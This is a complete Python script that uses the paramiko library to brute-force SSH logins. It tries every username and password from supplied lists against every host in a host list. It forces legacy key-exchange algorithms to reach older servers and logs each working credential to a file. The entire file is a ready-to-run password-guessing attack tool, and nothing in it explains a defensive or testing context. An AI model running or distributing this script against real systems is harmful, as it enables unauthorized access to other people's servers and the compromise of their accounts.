#!/usr/bin/env python3

import paramiko
import socket
from paramiko import SSHClient, AutoAddPolicy
from itertools import product

# Inputs
hosts = [line.strip() for line in open("hosts.txt")]
usernames = [line.strip() for line in open("users.txt")]
passwords = [line.strip() for line in open("pwds.txt")]

# Optional logging
success_log = open("success.txt", "w")
failure_log = open("failures.txt", "w")

# Modify paramiko's transport to use legacy algorithms
paramiko.transport._preferred_kex = ['diffie-hellman-group14-sha1']
paramiko.transport._preferred_keys = ['ssh-rsa']

for host in hosts:
    for username, password in product(usernames, passwords):
        print(f"[*] Trying {username}:{password} on {host}")
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(hostname=host, username=username, password=password,
                           allow_agent=False, look_for_keys=False,
                           timeout=5, banner_timeout=5)
            print(f"[+] Success: {username}@{host} with {password}")
            success_log.write(f"{username}@{host}:{password}\n")
            client.close()
            # Uncomment to stop on first success:
            # exit()
        except (paramiko.AuthenticationException, paramiko.SSHException, socket.error) as e:
            failure_log.write(f"{username}@{host}:{password} - {e}\n")
            continue

success_log.close()
failure_log.close()
